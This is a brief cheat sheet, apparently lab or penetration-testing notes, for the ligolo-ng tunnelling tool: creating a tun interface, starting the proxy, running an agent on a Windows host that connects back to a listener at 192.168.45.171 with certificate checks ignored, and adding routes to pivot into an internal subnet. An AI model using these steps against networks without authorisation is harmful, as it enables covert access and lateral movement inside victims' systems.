# ligolo-ng
## setup
create a tun interface
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

## proxy
```
./proxy -selfcert -laddr 0.0.0.0:9001
```

## agent
```
./agent.exe -connect 192.168.45.171:9001 -ignore-cert
```

## Connected
proxy
```
session
start
```

# LocalPort Forwarding Only
```
sudo ip route add 240.0.0.1/32 ligolo
```

# Pivot
```
sudo ip route add CIDR/24 ligolo
```